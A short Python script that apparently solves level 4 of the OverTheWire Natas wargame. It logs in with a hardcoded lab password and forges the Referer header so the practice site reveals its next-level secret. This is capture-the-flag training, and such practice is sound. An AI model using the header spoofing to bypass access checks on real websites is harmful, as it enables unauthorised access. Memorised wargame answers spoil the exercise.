import requests # ignore the error. Requests module is installed on school computers. 

website = "http://natas4.natas.labs.overthewire.org/"

sess = requests.Session()
sess.auth = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
sess.headers.update({'referer': "http://natas5.natas.labs.overthewire.org/"})
req = sess.get(website)

print(req.text)